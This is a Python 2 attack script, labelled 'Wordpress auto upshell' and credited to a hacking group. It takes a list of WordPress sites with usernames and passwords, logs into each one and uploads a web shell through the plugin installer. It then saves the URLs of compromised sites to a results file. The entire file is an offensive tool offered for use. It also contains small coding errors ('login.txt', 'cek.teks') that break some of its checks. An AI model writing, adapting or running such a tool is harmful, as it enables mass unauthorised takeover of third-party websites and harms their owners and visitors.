#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#RECODE JANGAN HAPUS AUTHOR YA ANJENK !
#Author D4RK5H4D0W5
G = '\033[0;32m'
C = '\033[0;36m'
W = '\033[0;37m'
R = '\033[0;31m'
Y = '\033[0;33m'
import requests,os,sys,datetime
from bs4 import BeautifulSoup
reload(sys)
sys.setdefaultencoding('utf8')
def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print '''%s
   _____ ____________________ 
  /  _  \\\______   \____    /    %sCoded by D4RKSH4D0WS%s
 /  /_\  \|       _/ /     /     %sIG @anonroz_team%s
/    |    \    |   \/     /_     %sFB gg.gg/AnonRoz-Team%s
\____|__  /____|_  /_______ \    %sWordpress auto upshell%s
        \/       \/        \/ 
	'''%(C,W,C,W,C,W,C,W,C)
	shell=open(sys.argv[2]).read()
	for arz in open(sys.argv[1]).read().splitlines():
		try:
			site=arz.split('|')[0]
			user=arz.split('|')[1]
			pasw=arz.split('|')[2]
			hd={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'}
			print '%s[%s!%s] Check website %s'%(W,R,W,site)
			r=requests.Session()
			cek=r.get(site,timeout=10)
			if cek.status_code==200 or cek.status_code==403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
				print '    Try login %s|%s|%s'%(site,user,pasw)
				login=r.post(site,headers=hd,data={'log':user,'pwd':pasw},timeout=10)
				if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.txt:
					print '%s[%s✓%s] Success login'%(W,G,W)
					print '    Wait for upload shell'
					try:
						nonce=BeautifulSoup(r.get(site.split('/wp')[0]+'/wp-admin/plugin-install.php',headers=hd,timeout=10).text,'html.parser').find('input',attrs={'id':'_wpnonce'})['value']
						r.post(site.split('/wp')[0]+'/wp-admin/update.php?action=upload-plugin',headers=hd,files={'_wpnonce':(None,nonce),'_wp_http_referer':(None,'/wp-admin/plugin-install.php'),'pluginzip':(sys.argv[2],shell,'application/octet-stream'),'install-plugin-submit':(None,'Install Now')},timeout=10)
					except:
						print '%s[%sx%s] Failed upload shell\n'%(W,R,W)
						continue
					tahun=datetime.datetime.now().strftime('%Y')
					bulan=datetime.datetime.now().strftime('%m')
					cek=r.get('%s/wp-content/uploads/%s/%s/%s'%(site.split('/wp')[0],tahun,bulan,sys.argv[2]),timeout=10)
					if cek.status_code==200 or 'UPLOAD' in cek.teks or 'upload' in cek.teks or 'uploads' in cek.teks:
						res='%s/wp-content/uploads/%s/%s/%s'%(site.split('/wp')[0],tahun,bulan,sys.argv[2])
						print '%s[%s✓%s] Success upload shell\n    %s'%(W,G,W,res)
						open('results.txt','a+').write(res+'\n')
					else:
						print '%s[%sx%s] Failed upload shell'%(W,R,W)
				else:
					print '%s[%sx%s] Failed login'%(W,R,W)
			else:
				print '%s[%sx%s] Blank page/no login wp'%(W,R,W)
		except:
			print '%s[%sx%s] Blank page/website error'%(W,R,W)
			pass
		print
	print '%s[%s✓%s] Saved in results.txt'%(W,G,W)
if __name__=='__main__':
	try:
		main()
	except IndexError:exit('%s[%s!%s] Use : python2 %s target.txt shell.php\n    Example: https://target.com/wp-login.php|admin|admin'%(W,R,W,sys.argv[0]))
	except IOError:exit('%s[%s!%s] File does not exist'%(W,R,W))
	except requests.exceptions.ConnectionError:exit('%s[%s!%s] Check internet'%(W,R,W))
	except KeyboardInterrupt:exit('%s[%s!%s] Exit'%(W,R,W))
